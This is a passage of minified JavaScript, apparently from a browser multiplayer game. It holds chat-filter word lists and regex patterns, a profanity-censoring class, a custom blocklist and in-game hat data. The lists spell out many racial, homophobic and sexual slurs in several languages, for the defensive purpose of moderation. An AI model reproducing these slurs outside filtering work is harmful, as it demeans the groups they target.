          "semen",
          "sex",
          "sexy",
          "Sh!t",
          "sh1t",
          "sh1ter",
          "sh1ts",
          "sh1tter",
          "sh1tz",
          "shit",
          "shits",
          "shitter",
          "Shitty",
          "Shity",
          "shitz",
          "Shyt",
          "Shyte",
          "Shytty",
          "Shyty",
          "skanck",
          "skank",
          "skankee",
          "skankey",
          "skanks",
          "Skanky",
          "slag",
          "slut",
          "sluts",
          "Slutty",
          "slutz",
          "son-of-a-bitch",
          "tit",
          "turd",
          "va1jina",
          "vag1na",
          "vagiina",
          "vagina",
          "vaj1na",
          "vajina",
          "vullva",
          "vulva",
          "w0p",
          "wh00r",
          "wh0re",
          "whore",
          "xrated",
          "xxx",
          "b!+ch",
          "bitch",
          "blowjob",
          "clit",
          "arschloch",
          "fuck",
          "shit",
          "ass",
          "asshole",
          "b!tch",
          "b17ch",
          "b1tch",
          "bastard",
          "bi+ch",
          "boiolas",
          "buceta",
          "c0ck",
          "cawk",
          "chink",
          "cipa",
          "clits",
          "cock",
          "cum",
          "cunt",
          "dildo",
          "dirsa",
          "ejakulate",
          "fatass",
          "fcuk",
          "fuk",
          "fux0r",
          "hoer",
          "hore",
          "jism",
          "kawk",
          "l3itch",
          "l3i+ch",
          "masturbate",
          "masterbat*",
          "masterbat3",
          "motherfucker",
          "s.o.b.",
          "mofo",
          "nazi",
          "nigga",
          "nigger",
          "nutsack",
          "phuck",
          "pimpis",
          "pusse",
          "pussy",
          "scrotum",
          "sh!t",
          "shemale",
          "shi+",
          "sh!+",
          "slut",
          "smut",
          "teets",
          "tits",
          "boobs",
          "b00bs",
          "teez",
          "testical",
          "testicle",
          "titt",
          "w00se",
          "jackoff",
          "wank",
          "whoar",
          "whore",
          "*damn",
          "*dyke",
          "*fuck*",
          "*shit*",
          "@$$",
          "amcik",
          "andskota",
          "arse*",
          "assrammer",
          "ayir",
          "bi7ch",
          "bitch*",
          "bollock*",
          "breasts",
          "butt-pirate",
          "cabron",
          "cazzo",
          "chraa",
          "chuj",
          "Cock*",
          "cunt*",
          "d4mn",
          "daygo",
          "dego",
          "dick*",
          "dike*",
          "dupa",
          "dziwka",
          "ejackulate",
          "Ekrem*",
          "Ekto",
          "enculer",
          "faen",
          "fag*",
          "fanculo",
          "fanny",
          "feces",
          "feg",
          "Felcher",
          "ficken",
          "fitt*",
          "Flikker",
          "foreskin",
          "Fotze",
          "Fu(*",
          "fuk*",
          "futkretzn",
          "gook",
          "guiena",
          "h0r",
          "h4x0r",
          "hell",
          "helvete",
          "hoer*",
          "honkey",
          "Huevon",
          "hui",
          "injun",
          "jizz",
          "kanker*",
          "kike",
          "klootzak",
          "kraut",
          "knulle",
          "kuk",
          "kuksuger",
          "Kurac",
          "kurwa",
          "kusi*",
          "kyrpa*",
          "lesbo",
          "mamhoon",
          "masturbat*",
          "merd*",
          "mibun",
          "monkleigh",
          "mouliewop",
          "muie",
          "mulkku",
          "muschi",
          "nazis",
          "nepesaurio",
          "nigger*",
          "orospu",
          "paska*",
          "perse",
          "picka",
          "pierdol*",
          "pillu*",
          "pimmel",
          "piss*",
          "pizda",
          "poontsee",
          "poop",
          "porn",
          "p0rn",
          "pr0n",
          "preteen",
          "pula",
          "pule",
          "puta",
          "puto",
          "qahbeh",
          "queef*",
          "rautenberg",
          "schaffer",
          "scheiss*",
          "schlampe",
          "schmuck",
          "screw",
          "sh!t*",
          "sharmuta",
          "sharmute",
          "shipal",
          "shiz",
          "skribz",
          "skurwysyn",
          "sphencter",
          "spic",
          "spierdalaj",
          "splooge",
          "suka",
          "b00b*",
          "testicle*",
          "titt*",
          "twat",
          "vittu",
          "wank*",
          "wetback*",
          "wichser",
          "wop*",
          "yed",
          "zabourah",
      ],
      Sc = {
          words: bc,
      };
var Tc = {
    "4r5e": 1,
    "5h1t": 1,
    "5hit": 1,
    a55: 1,
    anal: 1,
    anus: 1,
    ar5e: 1,
    arrse: 1,
    arse: 1,
    ass: 1,
    "ass-fucker": 1,
    asses: 1,
    assfucker: 1,
    assfukka: 1,
    asshole: 1,
    assholes: 1,
    asswhole: 1,
    a_s_s: 1,
    "b!tch": 1,
    b00bs: 1,
    b17ch: 1,
    b1tch: 1,
    ballbag: 1,
    balls: 1,
    ballsack: 1,
    bastard: 1,
    beastial: 1,
    beastiality: 1,
    bellend: 1,
    bestial: 1,
    bestiality: 1,
    "bi+ch": 1,
    biatch: 1,
    bitch: 1,
    bitcher: 1,
    bitchers: 1,
    bitches: 1,
    bitchin: 1,
    bitching: 1,
    bloody: 1,
    "blow job": 1,
    blowjob: 1,
    blowjobs: 1,
    boiolas: 1,
    bollock: 1,
    bollok: 1,
    boner: 1,
    boob: 1,
    boobs: 1,
    booobs: 1,
    boooobs: 1,
    booooobs: 1,
    booooooobs: 1,
    breasts: 1,
    buceta: 1,
    bugger: 1,
    bum: 1,
    "bunny fucker": 1,
    butt: 1,
    butthole: 1,
    buttmuch: 1,
    buttplug: 1,
    c0ck: 1,
    c0cksucker: 1,
    "carpet muncher": 1,
    cawk: 1,
    chink: 1,
    cipa: 1,
    cl1t: 1,
    clit: 1,
    clitoris: 1,
    clits: 1,
    cnut: 1,
    cock: 1,
    "cock-sucker": 1,
    cockface: 1,
    cockhead: 1,
    cockmunch: 1,
    cockmuncher: 1,
    cocks: 1,
    cocksuck: 1,
    cocksucked: 1,
    cocksucker: 1,
    cocksucking: 1,
    cocksucks: 1,
    cocksuka: 1,
    cocksukka: 1,
    cok: 1,
    cokmuncher: 1,
    coksucka: 1,
    coon: 1,
    cox: 1,
    crap: 1,
    cum: 1,
    cummer: 1,
    cumming: 1,
    cums: 1,
    cumshot: 1,
    cunilingus: 1,
    cunillingus: 1,
    cunnilingus: 1,
    cunt: 1,
    cuntlick: 1,
    cuntlicker: 1,
    cuntlicking: 1,
    cunts: 1,
    cyalis: 1,
    cyberfuc: 1,
    cyberfuck: 1,
    cyberfucked: 1,
    cyberfucker: 1,
    cyberfuckers: 1,
    cyberfucking: 1,
    d1ck: 1,
    damn: 1,
    dick: 1,
    dickhead: 1,
    dildo: 1,
    dildos: 1,
    dink: 1,
    dinks: 1,
    dirsa: 1,
    dlck: 1,
    "dog-fucker": 1,
    doggin: 1,
    dogging: 1,
    donkeyribber: 1,
    doosh: 1,
    duche: 1,
    dyke: 1,
    ejaculate: 1,
    ejaculated: 1,
    ejaculates: 1,
    ejaculating: 1,
    ejaculatings: 1,
    ejaculation: 1,
    ejakulate: 1,
    "f u c k": 1,
    "f u c k e r": 1,
    f4nny: 1,
    fag: 1,
    fagging: 1,
    faggitt: 1,
    faggot: 1,
    faggs: 1,
    fagot: 1,
    fagots: 1,
    fags: 1,
    fanny: 1,
    fannyflaps: 1,
    fannyfucker: 1,
    fanyy: 1,
    fatass: 1,
    fcuk: 1,
    fcuker: 1,
    fcuking: 1,
    feck: 1,
    fecker: 1,
    felching: 1,
    fellate: 1,
    fellatio: 1,
    fingerfuck: 1,
    fingerfucked: 1,
    fingerfucker: 1,
    fingerfuckers: 1,
    fingerfucking: 1,
    fingerfucks: 1,
    fistfuck: 1,
    fistfucked: 1,
    fistfucker: 1,
    fistfuckers: 1,
    fistfucking: 1,
    fistfuckings: 1,
    fistfucks: 1,
    flange: 1,
    fook: 1,
    fooker: 1,
    fuck: 1,
    fucka: 1,
    fucked: 1,
    fucker: 1,
    fuckers: 1,
    fuckhead: 1,
    fuckheads: 1,
    fuckin: 1,
    fucking: 1,
    fuckings: 1,
    fuckingshitmotherfucker: 1,
    fuckme: 1,
    fucks: 1,
    fuckwhit: 1,
    fuckwit: 1,
    "fudge packer": 1,
    fudgepacker: 1,
    fuk: 1,
    fuker: 1,
    fukker: 1,
    fukkin: 1,
    fuks: 1,
    fukwhit: 1,
    fukwit: 1,
    fux: 1,
    fux0r: 1,
    f_u_c_k: 1,
    gangbang: 1,
    gangbanged: 1,
    gangbangs: 1,
    gaylord: 1,
    gaysex: 1,
    goatse: 1,
    God: 1,
    "god-dam": 1,
    "god-damned": 1,
    goddamn: 1,
    goddamned: 1,
    hardcoresex: 1,
    hell: 1,
    heshe: 1,
    hoar: 1,
    hoare: 1,
    hoer: 1,
    homo: 1,
    hore: 1,
    horniest: 1,
    horny: 1,
    hotsex: 1,
    "jack-off": 1,
    jackoff: 1,
    jap: 1,
    "jerk-off": 1,
    jism: 1,
    jiz: 1,
    jizm: 1,
    jizz: 1,
    kawk: 1,
    knob: 1,
    knobead: 1,
    knobed: 1,
    knobend: 1,
    knobhead: 1,
    knobjocky: 1,
    knobjokey: 1,
    kock: 1,
    kondum: 1,
    kondums: 1,
    kum: 1,
    kummer: 1,
    kumming: 1,
    kums: 1,
    kunilingus: 1,
    "l3i+ch": 1,
    l3itch: 1,
    labia: 1,
    lust: 1,
    lusting: 1,
    m0f0: 1,
    m0fo: 1,
    m45terbate: 1,
    ma5terb8: 1,
    ma5terbate: 1,
    masochist: 1,
    "master-bate": 1,
    masterb8: 1,
    "masterbat*": 1,
    masterbat3: 1,
    masterbate: 1,
    masterbation: 1,
    masterbations: 1,
    masturbate: 1,
    "mo-fo": 1,
    mof0: 1,
    mofo: 1,
    mothafuck: 1,
    mothafucka: 1,
    mothafuckas: 1,
    mothafuckaz: 1,
    mothafucked: 1,
    mothafucker: 1,
    mothafuckers: 1,
    mothafuckin: 1,
    mothafucking: 1,
    mothafuckings: 1,
    mothafucks: 1,
    "mother fucker": 1,
    motherfuck: 1,
    motherfucked: 1,
    motherfucker: 1,
    motherfuckers: 1,
    motherfuckin: 1,
    motherfucking: 1,
    motherfuckings: 1,
    motherfuckka: 1,
    motherfucks: 1,
    muff: 1,
    mutha: 1,
    muthafecker: 1,
    muthafuckker: 1,
    muther: 1,
    mutherfucker: 1,
    n1gga: 1,
    n1gger: 1,
    nazi: 1,
    nigg3r: 1,
    nigg4h: 1,
    nigga: 1,
    niggah: 1,
    niggas: 1,
    niggaz: 1,
    nigger: 1,
    niggers: 1,
    nob: 1,
    "nob jokey": 1,
    nobhead: 1,
    nobjocky: 1,
    nobjokey: 1,
    numbnuts: 1,
    nutsack: 1,
    orgasim: 1,
    orgasims: 1,
    orgasm: 1,
    orgasms: 1,
    p0rn: 1,
    pawn: 1,
    pecker: 1,
    penis: 1,
    penisfucker: 1,
    phonesex: 1,
    phuck: 1,
    phuk: 1,
    phuked: 1,
    phuking: 1,
    phukked: 1,
    phukking: 1,
    phuks: 1,
    phuq: 1,
    pigfucker: 1,
    pimpis: 1,
    piss: 1,
    pissed: 1,
    pisser: 1,
    pissers: 1,
    pisses: 1,
    pissflaps: 1,
    pissin: 1,
    pissing: 1,
    pissoff: 1,
    poop: 1,
    porn: 1,
    porno: 1,
    pornography: 1,
    pornos: 1,
    prick: 1,
    pricks: 1,
    pron: 1,
    pube: 1,
    pusse: 1,
    pussi: 1,
    pussies: 1,
    pussy: 1,
    pussys: 1,
    rectum: 1,
    retard: 1,
    rimjaw: 1,
    rimming: 1,
    "s hit": 1,
    "s.o.b.": 1,
    sadist: 1,
    schlong: 1,
    screwing: 1,
    scroat: 1,
    scrote: 1,
    scrotum: 1,
    semen: 1,
    sex: 1,
    "sh!+": 1,
    "sh!t": 1,
    sh1t: 1,
    shag: 1,
    shagger: 1,
    shaggin: 1,
    shagging: 1,
    shemale: 1,
    "shi+": 1,
    shit: 1,
    shitdick: 1,
    shite: 1,
    shited: 1,
    shitey: 1,
    shitfuck: 1,
    shitfull: 1,
    shithead: 1,
    shiting: 1,
    shitings: 1,
    shits: 1,
    shitted: 1,
    shitter: 1,
    shitters: 1,
    shitting: 1,
    shittings: 1,
    shitty: 1,
    skank: 1,
    slut: 1,
    sluts: 1,
    smegma: 1,
    smut: 1,
    snatch: 1,
    "son-of-a-bitch": 1,
    spac: 1,
    spunk: 1,
    s_h_i_t: 1,
    t1tt1e5: 1,
    t1tties: 1,
    teets: 1,
    teez: 1,
    testical: 1,
    testicle: 1,
    tit: 1,
    titfuck: 1,
    tits: 1,
    titt: 1,
    tittie5: 1,
    tittiefucker: 1,
    titties: 1,
    tittyfuck: 1,
    tittywank: 1,
    titwank: 1,
    tosser: 1,
    turd: 1,
    tw4t: 1,
    twat: 1,
    twathead: 1,
    twatty: 1,
    twunt: 1,
    twunter: 1,
    v14gra: 1,
    v1gra: 1,
    vagina: 1,
    viagra: 1,
    vulva: 1,
    w00se: 1,
    wang: 1,
    wank: 1,
    wanker: 1,
    wanky: 1,
    whoar: 1,
    whore: 1,
    willies: 1,
    willy: 1,
    xrated: 1,
    xxx: 1,
},
    Ic = [
        "4r5e",
        "5h1t",
        "5hit",
        "a55",
        "anal",
        "anus",
        "ar5e",
        "arrse",
        "arse",
        "ass",
        "ass-fucker",
        "asses",
        "assfucker",
        "assfukka",
        "asshole",
        "assholes",
        "asswhole",
        "a_s_s",
        "b!tch",
        "b00bs",
        "b17ch",
        "b1tch",
        "ballbag",
        "balls",
        "ballsack",
        "bastard",
        "beastial",
        "beastiality",
        "bellend",
        "bestial",
        "bestiality",
        "bi+ch",
        "biatch",
        "bitch",
        "bitcher",
        "bitchers",
        "bitches",
        "bitchin",
        "bitching",
        "bloody",
        "blow job",
        "blowjob",
        "blowjobs",
        "boiolas",
        "bollock",
        "bollok",
        "boner",
        "boob",
        "boobs",
        "booobs",
        "boooobs",
        "booooobs",
        "booooooobs",
        "breasts",
        "buceta",
        "bugger",
        "bum",
        "bunny fucker",
        "butt",
        "butthole",
        "buttmuch",
        "buttplug",
        "c0ck",
        "c0cksucker",
        "carpet muncher",
        "cawk",
        "chink",
        "cipa",
        "cl1t",
        "clit",
        "clitoris",
        "clits",
        "cnut",
        "cock",
        "cock-sucker",
        "cockface",
        "cockhead",
        "cockmunch",
        "cockmuncher",
        "cocks",
        "cocksuck",
        "cocksucked",
        "cocksucker",
        "cocksucking",
        "cocksucks",
        "cocksuka",
        "cocksukka",
        "cok",
        "cokmuncher",
        "coksucka",
        "coon",
        "cox",
        "crap",
        "cum",
        "cummer",
        "cumming",
        "cums",
        "cumshot",
        "cunilingus",
        "cunillingus",
        "cunnilingus",
        "cunt",
        "cuntlick",
        "cuntlicker",
        "cuntlicking",
        "cunts",
        "cyalis",
        "cyberfuc",
        "cyberfuck",
        "cyberfucked",
        "cyberfucker",
        "cyberfuckers",
        "cyberfucking",
        "d1ck",
        "damn",
        "dick",
        "dickhead",
        "dildo",
        "dildos",
        "dink",
        "dinks",
        "dirsa",
        "dlck",
        "dog-fucker",
        "doggin",
        "dogging",
        "donkeyribber",
        "doosh",
        "duche",
        "dyke",
        "ejaculate",
        "ejaculated",
        "ejaculates",
        "ejaculating",
        "ejaculatings",
        "ejaculation",
        "ejakulate",
        "f u c k",
        "f u c k e r",
        "f4nny",
        "fag",
        "fagging",
        "faggitt",
        "faggot",
        "faggs",
        "fagot",
        "fagots",
        "fags",
        "fanny",
        "fannyflaps",
        "fannyfucker",
        "fanyy",
        "fatass",
        "fcuk",
        "fcuker",
        "fcuking",
        "feck",
        "fecker",
        "felching",
        "fellate",
        "fellatio",
        "fingerfuck",
        "fingerfucked",
        "fingerfucker",
        "fingerfuckers",
        "fingerfucking",
        "fingerfucks",
        "fistfuck",
        "fistfucked",
        "fistfucker",
        "fistfuckers",
        "fistfucking",
        "fistfuckings",
        "fistfucks",
        "flange",
        "fook",
        "fooker",
        "fuck",
        "fucka",
        "fucked",
        "fucker",
        "fuckers",
        "fuckhead",
        "fuckheads",
        "fuckin",
        "fucking",
        "fuckings",
        "fuckingshitmotherfucker",
        "fuckme",
        "fucks",
        "fuckwhit",
        "fuckwit",
        "fudge packer",
        "fudgepacker",
        "fuk",
        "fuker",
        "fukker",
        "fukkin",
        "fuks",
        "fukwhit",
        "fukwit",
        "fux",
        "fux0r",
        "f_u_c_k",
        "gangbang",
        "gangbanged",
        "gangbangs",
        "gaylord",
        "gaysex",
        "goatse",
        "God",
        "god-dam",
        "god-damned",
        "goddamn",
        "goddamned",
        "hardcoresex",
        "hell",
        "heshe",
        "hoar",
        "hoare",
        "hoer",
        "homo",
        "hore",
        "horniest",
        "horny",
        "hotsex",
        "jack-off",
        "jackoff",
        "jap",
        "jerk-off",
        "jism",
        "jiz",
        "jizm",
        "jizz",
        "kawk",
        "knob",
        "knobead",
        "knobed",
        "knobend",
        "knobhead",
        "knobjocky",
        "knobjokey",
        "kock",
        "kondum",
        "kondums",
        "kum",
        "kummer",
        "kumming",
        "kums",
        "kunilingus",
        "l3i+ch",
        "l3itch",
        "labia",
        "lust",
        "lusting",
        "m0f0",
        "m0fo",
        "m45terbate",
        "ma5terb8",
        "ma5terbate",
        "masochist",
        "master-bate",
        "masterb8",
        "masterbat*",
        "masterbat3",
        "masterbate",
        "masterbation",
        "masterbations",
        "masturbate",
        "mo-fo",
        "mof0",
        "mofo",
        "mothafuck",
        "mothafucka",
        "mothafuckas",
        "mothafuckaz",
        "mothafucked",
        "mothafucker",
        "mothafuckers",
        "mothafuckin",
        "mothafucking",
        "mothafuckings",
        "mothafucks",
        "mother fucker",
        "motherfuck",
        "motherfucked",
        "motherfucker",
        "motherfuckers",
        "motherfuckin",
        "motherfucking",
        "motherfuckings",
        "motherfuckka",
        "motherfucks",
        "muff",
        "mutha",
        "muthafecker",
        "muthafuckker",
        "muther",
        "mutherfucker",
        "n1gga",
        "n1gger",
        "nazi",
        "nigg3r",
        "nigg4h",
        "nigga",
        "niggah",
        "niggas",
        "niggaz",
        "nigger",
        "niggers",
        "nob",
        "nob jokey",
        "nobhead",
        "nobjocky",
        "nobjokey",
        "numbnuts",
        "nutsack",
        "orgasim",
        "orgasims",
        "orgasm",
        "orgasms",
        "p0rn",
        "pawn",
        "pecker",
        "penis",
        "penisfucker",
        "phonesex",
        "phuck",
        "phuk",
        "phuked",
        "phuking",
        "phukked",
        "phukking",
        "phuks",
        "phuq",
        "pigfucker",
        "pimpis",
        "piss",
        "pissed",
        "pisser",
        "pissers",
        "pisses",
        "pissflaps",
        "pissin",
        "pissing",
        "pissoff",
        "poop",
        "porn",
        "porno",
        "pornography",
        "pornos",
        "prick",
        "pricks",
        "pron",
        "pube",
        "pusse",
        "pussi",
        "pussies",
        "pussy",
        "pussys",
        "rectum",
        "retard",
        "rimjaw",
        "rimming",
        "s hit",
        "s.o.b.",
        "sadist",
        "schlong",
        "screwing",
        "scroat",
        "scrote",
        "scrotum",
        "semen",
        "sex",
        "sh!+",
        "sh!t",
        "sh1t",
        "shag",
        "shagger",
        "shaggin",
        "shagging",
        "shemale",
        "shi+",
        "shit",
        "shitdick",
        "shite",
        "shited",
        "shitey",
        "shitfuck",
        "shitfull",
        "shithead",
        "shiting",
        "shitings",
        "shits",
        "shitted",
        "shitter",
        "shitters",
        "shitting",
        "shittings",
        "shitty",
        "skank",
        "slut",
        "sluts",
        "smegma",
        "smut",
        "snatch",
        "son-of-a-bitch",
        "spac",
        "spunk",
        "s_h_i_t",
        "t1tt1e5",
        "t1tties",
        "teets",
        "teez",
        "testical",
        "testicle",
        "tit",
        "titfuck",
        "tits",
        "titt",
        "tittie5",
        "tittiefucker",
        "titties",
        "tittyfuck",
        "tittywank",
        "titwank",
        "tosser",
        "turd",
        "tw4t",
        "twat",
        "twathead",
        "twatty",
        "twunt",
        "twunter",
        "v14gra",
        "v1gra",
        "vagina",
        "viagra",
        "vulva",
        "w00se",
        "wang",
        "wank",
        "wanker",
        "wanky",
        "whoar",
        "whore",
        "willies",
        "willy",
        "xrated",
        "xxx",
    ],
    Mc =
    /\b(4r5e|5h1t|5hit|a55|anal|anus|ar5e|arrse|arse|ass|ass-fucker|asses|assfucker|assfukka|asshole|assholes|asswhole|a_s_s|b!tch|b00bs|b17ch|b1tch|ballbag|balls|ballsack|bastard|beastial|beastiality|bellend|bestial|bestiality|bi\+ch|biatch|bitch|bitcher|bitchers|bitches|bitchin|bitching|bloody|blow job|blowjob|blowjobs|boiolas|bollock|bollok|boner|boob|boobs|booobs|boooobs|booooobs|booooooobs|breasts|buceta|bugger|bum|bunny fucker|butt|butthole|buttmuch|buttplug|c0ck|c0cksucker|carpet muncher|cawk|chink|cipa|cl1t|clit|clitoris|clits|cnut|cock|cock-sucker|cockface|cockhead|cockmunch|cockmuncher|cocks|cocksuck|cocksucked|cocksucker|cocksucking|cocksucks|cocksuka|cocksukka|cok|cokmuncher|coksucka|coon|cox|crap|cum|cummer|cumming|cums|cumshot|cunilingus|cunillingus|cunnilingus|cunt|cuntlick|cuntlicker|cuntlicking|cunts|cyalis|cyberfuc|cyberfuck|cyberfucked|cyberfucker|cyberfuckers|cyberfucking|d1ck|damn|dick|dickhead|dildo|dildos|dink|dinks|dirsa|dlck|dog-fucker|doggin|dogging|donkeyribber|doosh|duche|dyke|ejaculate|ejaculated|ejaculates|ejaculating|ejaculatings|ejaculation|ejakulate|f u c k|f u c k e r|f4nny|fag|fagging|faggitt|faggot|faggs|fagot|fagots|fags|fanny|fannyflaps|fannyfucker|fanyy|fatass|fcuk|fcuker|fcuking|feck|fecker|felching|fellate|fellatio|fingerfuck|fingerfucked|fingerfucker|fingerfuckers|fingerfucking|fingerfucks|fistfuck|fistfucked|fistfucker|fistfuckers|fistfucking|fistfuckings|fistfucks|flange|fook|fooker|fuck|fucka|fucked|fucker|fuckers|fuckhead|fuckheads|fuckin|fucking|fuckings|fuckingshitmotherfucker|fuckme|fucks|fuckwhit|fuckwit|fudge packer|fudgepacker|fuk|fuker|fukker|fukkin|fuks|fukwhit|fukwit|fux|fux0r|f_u_c_k|gangbang|gangbanged|gangbangs|gaylord|gaysex|goatse|God|god-dam|god-damned|goddamn|goddamned|hardcoresex|hell|heshe|hoar|hoare|hoer|homo|hore|horniest|horny|hotsex|jack-off|jackoff|jap|jerk-off|jism|jiz|jizm|jizz|kawk|knob|knobead|knobed|knobend|knobhead|knobjocky|knobjokey|kock|kondum|kondums|kum|kummer|kumming|kums|kunilingus|l3i\+ch|l3itch|labia|lust|lusting|m0f0|m0fo|m45terbate|ma5terb8|ma5terbate|masochist|master-bate|masterb8|masterbat*|masterbat3|masterbate|masterbation|masterbations|masturbate|mo-fo|mof0|mofo|mothafuck|mothafucka|mothafuckas|mothafuckaz|mothafucked|mothafucker|mothafuckers|mothafuckin|mothafucking|mothafuckings|mothafucks|mother fucker|motherfuck|motherfucked|motherfucker|motherfuckers|motherfuckin|motherfucking|motherfuckings|motherfuckka|motherfucks|muff|mutha|muthafecker|muthafuckker|muther|mutherfucker|n1gga|n1gger|nazi|nigg3r|nigg4h|nigga|niggah|niggas|niggaz|nigger|niggers|nob|nob jokey|nobhead|nobjocky|nobjokey|numbnuts|nutsack|orgasim|orgasims|orgasm|orgasms|p0rn|pawn|pecker|penis|penisfucker|phonesex|phuck|phuk|phuked|phuking|phukked|phukking|phuks|phuq|pigfucker|pimpis|piss|pissed|pisser|pissers|pisses|pissflaps|pissin|pissing|pissoff|poop|porn|porno|pornography|pornos|prick|pricks|pron|pube|pusse|pussi|pussies|pussy|pussys|rectum|retard|rimjaw|rimming|s hit|s.o.b.|sadist|schlong|screwing|scroat|scrote|scrotum|semen|sex|sh!\+|sh!t|sh1t|shag|shagger|shaggin|shagging|shemale|shi\+|shit|shitdick|shite|shited|shitey|shitfuck|shitfull|shithead|shiting|shitings|shits|shitted|shitter|shitters|shitting|shittings|shitty|skank|slut|sluts|smegma|smut|snatch|son-of-a-bitch|spac|spunk|s_h_i_t|t1tt1e5|t1tties|teets|teez|testical|testicle|tit|titfuck|tits|titt|tittie5|tittiefucker|titties|tittyfuck|tittywank|titwank|tosser|turd|tw4t|twat|twathead|twatty|twunt|twunter|v14gra|v1gra|vagina|viagra|vulva|w00se|wang|wank|wanker|wanky|whoar|whore|willies|willy|xrated|xxx)\b/gi,
    Ec = {
        object: Tc,
        array: Ic,
        regex: Mc,
    };
const Pc = Sc.words,
      Cc = Ec.array;
class Ac {
    constructor(t = {}) {
        Object.assign(this, {
            list:
            (t.emptyList && []) ||
            Array.prototype.concat.apply(Pc, [Cc, t.list || []]),
            exclude: t.exclude || [],
            splitRegex: t.splitRegex || /\b/,
            placeHolder: t.placeHolder || "*",
            regex: t.regex || /[^a-zA-Z0-9|\$|\@]|\^/g,
            replaceRegex: t.replaceRegex || /\w/g,
        });
    }
    isProfane(t) {
        return (
            this.list.filter((n) => {
                let i = RegExp(`\\b${n.replace(/(\W)/g, "\\$1")}\\b`, "gi");
                return !this.exclude.includes(n.toLowerCase()) && i.test(t);
            }).length > 0
        );
    }
    replaceWord(t) {
        return t
            .replace(this.regex, "")
            .replace(this.replaceRegex, this.placeHolder);
    }
    clean(t) {
        return t
            .split(this.splitRegex)
            .map((t) => (this.isProfane(t) ? this.replaceWord(t) : t))
            .join(this.splitRegex.exec(t)[0]);
    }
    addWords() {
        let t = Array.from(arguments);
        this.list.push(...t),
            t
            .map((t) => t.toLowerCase())
            .forEach((t) => {
            this.exclude.includes(t) &&
                this.exclude.splice(this.exclude.indexOf(t), 1);
        });
    }
    removeWords() {
        this.exclude.push(...Array.from(arguments).map((t) => t.toLowerCase()));
    }
}
var Dc = Ac;
const Yr = new Dc(),
      Oc = [
          "jew",
          "black",
          "baby",
          "child",
          "white",
          "porn",
          "pedo",
          "trump",
          "clinton",
          "hitler",
          "nazi",
          "gay",
          "pride",
          "sex",
          "pleasure",
          "touch",
          "poo",
          "kids",
          "rape",
          "white power",
          "nigga",
          "nig nog",
          "doggy",
          "rapist",
          "boner",
          "nigger",
          "nigg",
          "finger",
          "nogger",
          "nagger",
          "nig",
          "fag",
          "gai",
          "pole",
          "stripper",
          "penis",
          "vagina",
          "pussy",
          "nazi",
          "hitler",
          "stalin",
          "burn",
          "chamber",
          "cock",
          "peen",
          "dick",
          "spick",
          "nieger",
          "die",
          "satan",
          "n|ig",
          "nlg",
          "cunt",
          "c0ck",
          "fag",
          "lick",
          "condom",
          "anal",
          "shit",
          "phile",
          "little",
          "kids",
          "free KR",
          "tiny",
          "sidney",
          "ass",
          "kill",
          ".io",
          "(dot)",
          "[dot]",
          "mini",
          "whiore",
          "whore",
          "faggot",
          "github",
          "1337",
          "666",
          "satan",
          "senpa",
          "discord",
          "d1scord",
          "mistik",
          ".io",
          "senpa.io",
          "sidney",
          "sid",
          "senpaio",
          "vries",
          "asa",
      ];
Yr.addWords(...Oc);
const _s = Math.abs,
      at = Math.cos,
      lt = Math.sin,
      Bs = Math.pow,
      Rc = Math.sqrt;

function hslToHex(t, n, i) {
    (t /= 360), (i /= 100);
    let o, a, r;
    if (0 == (n /= 100)) o = a = r = i;
    else {
        let s = (t, n, i) =>
        (i < 0 && (i += 1), i > 1 && (i -= 1), i < 1 / 6)
        ? t + (n - t) * 6 * i
        : i < 0.5
        ? n
        : i < 2 / 3
        ? t + (n - t) * (2 / 3 - i) * 6
        : t,
            l = i < 0.5 ? i * (1 + n) : i + n - i * n,
            c = 2 * i - l;
        (o = s(c, l, t + 1 / 3)), (a = s(c, l, t)), (r = s(c, l, t - 1 / 3));
    }
    let d = (t) => {
        let n = Math.round(255 * t).toString(16);
        return 1 === n.length ? "0" + n : n;
    },
        h = `#${d(o)}${d(a)}${d(r)}`;
    return h;
}
const Bc = [
    {
        id: 45,
        name: "Shame!",
        dontSell: !0,
        price: 0,
        scale: 120,
        desc: "hacks are for losers",
    },
    {
        id: 51,
        name: "Moo Cap",
        price: 0,
        scale: 120,
        desc: "coolest mooer around",
    },
    {
        id: 50,
        name: "Apple Cap",
        price: 0,
        scale: 120,
        desc: "apple farms remembers",
    },
    {
        id: 28,
        name: "Moo Head",
        price: 0,
        scale: 120,
        desc: "no effect",
    },
    {
        id: 29,
        name: "Pig Head",
        price: 0,
        scale: 120,
        desc: "no effect",
    },
    {
        id: 30,
        name: "Fluff Head",
        price: 0,
        scale: 120,
        desc: "no effect",
    },
    {
        id: 36,
        name: "Pandou Head",
        price: 0,
        scale: 120,
        desc: "no effect",
    },
    {
        id: 37,
        name: "Bear Head",
        price: 0,
        scale: 120,
        desc: "no effect",
    },
    {
        id: 38,
        name: "Monkey Head",
        price: 0,
        scale: 120,
        desc: "no effect",
    },
    {
        id: 44,
        name: "Polar Head",
        price: 0,
        scale: 120,
        desc: "no effect",
    },
    {
        id: 35,
        name: "Fez Hat",
        price: 0,
        scale: 120,
        desc: "no effect",
    },
    {
        id: 42,
        name: "Enigma Hat",
        price: 0,
        scale: 120,
        desc: "join the enigma army",
    },
    {
        id: 43,
        name: "Blitz Hat",
        price: 0,
        scale: 120,
        desc: "hey everybody i'm blitz",
    },
    {
        id: 49,
        name: "Bob XIII Hat",
        price: 0,
        scale: 120,
        desc: "like and subscribe",
    },
    {
        id: 57,
        name: "Pumpkin",
        price: 50,
        scale: 120,
        desc: "Spooooky",
    },
    {
        id: 8,
        name: "Bummle Hat",
        price: 100,
        scale: 120,
        desc: "no effect",
    },
    {
        id: 2,
        name: "Straw Hat",
        price: 500,
        scale: 120,
        desc: "no effect",
    },
    {
        id: 15,
        name: "Winter Cap",
        price: 600,
        scale: 120,
        desc: "allows you to move at normal speed in snow",
        coldM: 1,
    },
    {
        id: 5,
        name: "Cowboy Hat",
        price: 1e3,
        scale: 120,
        desc: "no effect",
    },
    {
        id: 4,
        name: "Ranger Hat",
        price: 2e3,
        scale: 120,
        desc: "no effect",
    },
    {
        id: 18,
        name: "Explorer Hat",
        price: 2e3,
        scale: 120,
        desc: "no effect",
    },
    {
        id: 31,
        name: "Flipper Hat",
        price: 2500,
        scale: 120,
        desc: "have more control while in water",
        watrImm: !0,
    },
    {
        id: 1,
        name: "Marksman Cap",
        price: 3e3,
        scale: 120,
        desc: "increases arrow speed and range",
        aMlt: 1.3,
    },
    {
        id: 10,
        name: "Bush Gear",
        price: 3e3,
        scale: 160,
        desc: "allows you to disguise yourself as a bush",
    },
    {
        id: 48,
        name: "Halo",
